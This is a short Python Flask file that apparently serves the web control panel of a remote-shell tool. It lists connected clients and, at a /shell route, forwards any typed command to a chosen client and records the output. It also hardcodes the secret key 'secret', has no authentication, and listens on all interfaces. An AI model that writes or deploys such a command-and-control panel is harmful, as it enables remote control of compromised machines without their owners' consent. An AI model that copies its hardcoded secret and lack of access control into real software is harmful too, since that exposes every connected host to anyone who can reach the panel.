from threading import Thread

from flask import Flask, session, render_template, redirect, url_for, request
from Server import server

app = Flask(__name__)
app.secret_key = "secret"


@app.route('/')
def hello():
    return redirect(url_for("clients"))


@app.route("/clients")
def clients():
    return render_template("clients.html", cls=server.clients)


@app.route("/shell/<id>", methods=["POST", "GET"])
def shell(id=-1):
    id_int = int(id)
    client = server.clients[id_int]
    if request.method == "GET":
        return render_template("shell.html", client=client)
    else:
        cmd = request.form["cmd"]
        output = server.send_command(cmd, client)
        client.append_output(output)
        return render_template("shell.html", client=client)


if __name__ == '__main__':
    thread = Thread(target=server.listen_for_clients)
    thread.start()
    app.run(host="0.0.0.0")
